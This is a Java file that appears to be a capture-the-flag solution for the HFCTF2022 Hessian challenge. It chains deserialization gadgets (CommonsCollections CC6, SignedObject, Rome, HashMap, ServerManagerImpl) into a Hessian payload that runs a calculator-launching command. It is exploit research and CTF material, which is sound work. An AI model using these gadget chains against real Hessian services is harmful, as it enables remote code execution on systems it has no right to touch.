package xyz.eki.marshalexp.solution;

import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
import xyz.eki.marshalexp.gadget.jdk.GHashMap;
import xyz.eki.marshalexp.gadget.jdk.GServerManagerImpl;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.gadget.rome.GRome;
import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.utils.SerializeUtils;
import jdk.management.resource.ResourceContextFactory;

public class HFCTF2022Hessian {

    public static void case1() throws Exception{
        Object signedObj = GSignedObject.getter2Deserialize(new CC6().getPocObject("open -a Calculator.app"));
        Object gadget = GRome.toString2Getter(signedObj);
        Object exp = GHashMap.deserialize2HashCode(gadget,gadget);
        SerializeUtils.hessian2Deserialize(SerializeUtils.hessian2Serialize(exp));
    }

    public static void case2() throws Exception{
        Object sink = GServerManagerImpl.getter2RCE("open -a Calculator");
        Object gadget = GRome.toString2Getter(sink);
        Object exp = GHashMap.deserialize2HashCode(gadget,gadget);
        SerializeUtils.hessian2Deserialize(SerializeUtils.hessian2Serialize(exp));
    }
    public static void main(String[] args) throws Exception{
        case2();
    }
}
